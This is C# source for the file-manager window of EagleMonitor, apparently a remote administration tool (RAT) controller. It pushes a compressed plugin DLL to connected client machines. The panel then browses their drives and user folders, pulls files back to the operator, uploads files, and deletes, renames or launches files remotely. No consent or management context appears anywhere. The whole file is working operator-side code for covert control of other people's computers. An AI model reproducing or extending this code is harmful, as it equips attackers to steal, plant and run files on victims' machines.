﻿using EagleMonitor.Networking;
using EagleMonitor.Utils;
using EagleMonitor.Controls;
using PacketLib;
using PacketLib.Packet;
using System;
using System.IO;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Drawing;
using System.Collections.Generic;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace EagleMonitor.Forms
{
    public partial class FileManagerForm : FormPattern
    {
        internal static Dictionary<string, DownloadFileForm> downloadForms;
        static FileManagerForm()
        {
            downloadForms = new Dictionary<string, DownloadFileForm>();
        }

        private ClientHandler clientHandler { get; set; }

        internal FileManagerForm(ClientHandler clientHandler)
        {
            this.clientHandler = clientHandler;
            InitializeComponent();
        }

        private void FileManagerForm_Load(object sender, EventArgs e)
        {
            Miscellaneous.Enable(this.fileListView);
            DiskPacket diskPacket = new DiskPacket();
            diskPacket.plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\FileManager.dll"), 1);
            this.clientHandler.SendPacket(diskPacket);
        }

        private void diskComboBox_SelectedIndexChanged(object sender, EventArgs e)
        {
            this.labelPath.Text = diskComboBox.Text;
            FileManagerPacket fileManagerPacket = new FileManagerPacket(labelPath.Text)
            {
                plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\FileManager.dll"), 1)
            };
            this.loadingCircle1.Visible = true;
            this.loadingCircle1.Active = true;
            clientHandler.SendPacket(fileManagerPacket);
        }

        private void goToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (fileListView.SelectedItems.Count == 1)
            {
                if (fileListView.SelectedItems[0].Tag.ToString() == "FOLDER")
                {
                    string NewPath = labelPath.Text + fileListView.SelectedItems[0].Text + "\\";
                    this.labelPath.Text = NewPath;
                    FileManagerPacket fileManagerPacket = new FileManagerPacket(labelPath.Text)
                    {
                        plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\FileManager.dll"), 1)
                    };
                    this.loadingCircle1.Visible = true;
                    this.loadingCircle1.Active = true;
                    clientHandler.SendPacket(fileManagerPacket);
                }
            }
        }

        private void backToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.labelPath.Text.Length > 3)
            {
                string[] Splitter = this.labelPath.Text.Split('\\');
                string NewPath = null;
                for (var i = 0; i <= Splitter.Length - 3; i++)
                {
                    NewPath += Splitter[i] + "\\";
                }
                this.labelPath.Text = NewPath;
                FileManagerPacket fileManagerPacket = new FileManagerPacket(labelPath.Text)
                {
                    plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\FileManager.dll"), 1)
                };
                this.loadingCircle1.Visible = true;
                this.loadingCircle1.Active = true;
                clientHandler.SendPacket(fileManagerPacket);
            }
        }

        private void fileListView_MouseDoubleClick(object sender, MouseEventArgs e)
        {
            if (fileListView.SelectedItems[0].Tag.ToString() == "FOLDER" && fileListView.SelectedItems.Count == 1)
            {
                this.loadingCircle1.Visible = true;
                this.loadingCircle1.Active = true;
                string NewPath = labelPath.Text + fileListView.SelectedItems[0].Text + "\\";
                this.labelPath.Text = NewPath;
                FileManagerPacket fileManagerPacket = new FileManagerPacket(labelPath.Text)
                {
                    plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\FileManager.dll"), 1)
                };
                clientHandler.SendPacket(fileManagerPacket);
            }
            else if (fileListView.SelectedItems[0].Tag.ToString() != "FOLDER" && fileListView.SelectedItems.Count == 1)
            {
                string fileToStart = labelPath.Text + fileListView.SelectedItems[0].Text;

                StartFilePacket startFilePacket = new StartFilePacket(fileToStart)
                {
                    plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\FileManager.dll"), 1)
                };
                clientHandler.SendPacket(startFilePacket);
            }
        }

        private void downloadToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem selected in fileListView.SelectedItems)
            {
                if (selected.Tag.ToString() != "FOLDER")
                {
                    string fileToDownload = labelPath.Text + selected.Text;

                    DownloadFileForm downloadFileForm = new DownloadFileForm(fileToDownload, this.clientHandler.IP, long.Parse(selected.Tag.ToString()))
                    {
                        Text = fileToDownload
                    };

                    if (File.Exists(this.clientHandler.clientPath + "\\Downloaded Files\\" + selected.Text))
                    {
                        DialogResult redownload = MessageBox.Show(this,"You've already downloaded this file. Do you want to re-download it again (old will be deleted) ?", "Eagle Monitor", MessageBoxButtons.YesNo);
                        if (redownload == DialogResult.No)
                            return;
                        else
                            File.Delete(this.clientHandler.clientPath + "\\Downloaded Files\\" + selected.Text);
                    }

                    downloadFileForm.label1.Text = Miscellaneous.SplitPath(fileToDownload);
                    downloadFileForm.Show();
                }
            }
        }

        private void deleteToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem selected in fileListView.SelectedItems)
            {
                if (selected.Tag.ToString() != "FOLDER")
                {
                    string fileToDelete = labelPath.Text + selected.Text;

                    DeleteFilePacket deleteFilePacket = new DeleteFilePacket(fileToDelete, Miscellaneous.SplitPath(fileToDelete))
                    {
                        plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\FileManager.dll"), 1)
                    };
                    clientHandler.SendPacket(deleteFilePacket);
                }
            }
        }

        private void launchToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem selected in fileListView.SelectedItems)
            {
                if (selected.Tag.ToString() != "FOLDER")
                {
                    string fileToStart = labelPath.Text + selected.Text;

                    StartFilePacket startFilePacket = new StartFilePacket(fileToStart)
                    {
                        plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\FileManager.dll"), 1)
                    };
                    clientHandler.SendPacket(startFilePacket);
                }
            }
        }

        private void renameToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem selected in fileListView.SelectedItems)
            {
                if (selected.Tag.ToString() != "FOLDER")
                {
                    string fileToRename = labelPath.Text + selected.Text;

                    string[] S = Microsoft.VisualBasic.Strings.Split(fileToRename, "\\");
                    string[] S1 = S[S.Length - 1].Split('.');
                    string oldName = S[S.Length - 1];
                    string newName = Microsoft.VisualBasic.Interaction.InputBox("The new name : (without extension)") + "." + S1[S1.Length - 1];
                    string newPath = null;
                    for (var H = 0; H <= S.Length - 2; H++)
                    {
                        newPath += S[H] + "\\";
                    }
                    newPath += newName;

                    RenameFilePacket renameFilePacket = new RenameFilePacket(oldName, fileToRename, newName, newPath)
                    {
                        plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\FileManager.dll"), 1)
                    };
                    clientHandler.SendPacket(renameFilePacket);
                }
            }
        }

        private void downloadShortCutStripMenuItem_Click(object sender, EventArgs e)
        {
            this.loadingCircle1.Visible = true;
            this.loadingCircle1.Active = true;
            ShortCutFileManagersPacket shortCutFileManagersPacket = new ShortCutFileManagersPacket(ShortCutFileManagersPacket.ShortCuts.DOWNLOADS)
            {
                plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\FileManager.dll"), 1)
            };
            clientHandler.SendPacket(shortCutFileManagersPacket);
        }
        private void uploadToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (fileListView.SelectedItems.Count == 0 || fileListView.SelectedItems[0].Tag.ToString() != "FOLDER")
            {
                using (OpenFileDialog ofd = new OpenFileDialog())
                {
                    if (ofd.ShowDialog() == DialogResult.OK)
                    {
                        string fileName = Miscellaneous.SplitPath(ofd.FileName);
                        string path = labelPath.Text + fileName;
                        UploadFilePacket uploadFilePacket = new UploadFilePacket(path, Compressor.QuickLZ.Compress(File.ReadAllBytes(ofd.FileName), 1))
                        {
                            plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\FileManager.dll"), 1)
                        };
                        clientHandler.SendPacket(uploadFilePacket);
                    }
                }
            }
            else if (fileListView.SelectedItems[0].Tag.ToString() == "FOLDER")
            {
                using (OpenFileDialog ofd = new OpenFileDialog())
                {
                    if (ofd.ShowDialog() == DialogResult.OK)
                    {
                        string fileName = Miscellaneous.SplitPath(ofd.FileName);
                        string path = labelPath.Text + fileListView.SelectedItems[0].Text + "\\" + fileName;
                        UploadFilePacket uploadFilePacket = new UploadFilePacket(path, Compressor.QuickLZ.Compress(File.ReadAllBytes(ofd.FileName), 1))
                        {
                            plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\FileManager.dll"), 1)
                        };
                        clientHandler.SendPacket(uploadFilePacket);
                    }
                }
            }
        }

        private void desktopShortCutStripMenuItem_Click(object sender, EventArgs e)
        {
            this.loadingCircle1.Visible = true;
            this.loadingCircle1.Active = true;
            ShortCutFileManagersPacket shortCutFileManagersPacket = new ShortCutFileManagersPacket(ShortCutFileManagersPacket.ShortCuts.DESKTOP)
            {
                plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\FileManager.dll"), 1)
            };
            clientHandler.SendPacket(shortCutFileManagersPacket);
        }

        private void documentsShortCutStripMenuItem_Click(object sender, EventArgs e)
        {
            this.loadingCircle1.Visible = true;
            this.loadingCircle1.Active = true;
            ShortCutFileManagersPacket shortCutFileManagersPacket = new ShortCutFileManagersPacket(ShortCutFileManagersPacket.ShortCuts.DOCUMENTS)
            {
                plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Miscellaneous.GPath + "\\Plugins\\FileManager.dll"), 1)
            };
            clientHandler.SendPacket(shortCutFileManagersPacket);
        }

        private void userProfileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            this.loadingCircle1.Visible = true;
            this.loadingCircle1.Active = true;
            ShortCutFileManagersPacket shortCutFileManagersPacket = new ShortCutFileManagersPacket(ShortCutFileManagersPacket.ShortCuts.USER_PROFILE)
            {
                plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Miscellaneous.GPath + "\\Plugins\\FileManager.dll"), 1)
            };
            clientHandler.SendPacket(shortCutFileManagersPacket);
        }

        private void refreshGuna2CirclePictureBox_Click(object sender, EventArgs e)
        {
            string NewPath = labelPath.Text;
            this.labelPath.Text = NewPath;
            FileManagerPacket fileManagerPacket = new FileManagerPacket(labelPath.Text)
            {
                plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\FileManager.dll"), 1)
            };
            this.loadingCircle1.Visible = true;
            this.loadingCircle1.Active = true;
            clientHandler.SendPacket(fileManagerPacket);
        }

        private void refreshGuna2CirclePictureBox_MouseHover(object sender, EventArgs e)
        {
            refreshGuna2CirclePictureBox.BackColor = Color.FromArgb(50, 50, 50);
        }

        private void refreshGuna2CirclePictureBox_MouseDown(object sender, MouseEventArgs e)
        {
            refreshGuna2CirclePictureBox.BackColor = Color.FromArgb(60, 60, 60);
        }

        private void refreshGuna2CirclePictureBox_MouseUp(object sender, MouseEventArgs e)
        {
            refreshGuna2CirclePictureBox.BackColor = Color.FromArgb(50, 50, 50);
        }

        private void refreshGuna2CirclePictureBox_MouseLeave(object sender, EventArgs e)
        {
            refreshGuna2CirclePictureBox.BackColor = Color.FromArgb(45, 45, 45);
        }

        private void closeButton_Click(object sender, EventArgs e)
        {
            this.Close();
        }

        private void maximizeButton_Click(object sender, EventArgs e)
        {
            if (this.WindowState == FormWindowState.Normal)
            {
                this.WindowState = FormWindowState.Maximized;
            }
            else
            {
                this.WindowState = FormWindowState.Normal;
            }
        }

        private void minimizeButton_Click(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Minimized;
        }

        private void label1_MouseDown(object sender, MouseEventArgs e)
        {
            ReleaseCapture();
            SendMessage(this.FindForm().Handle, 161, 2, 0);
        }
    }
}
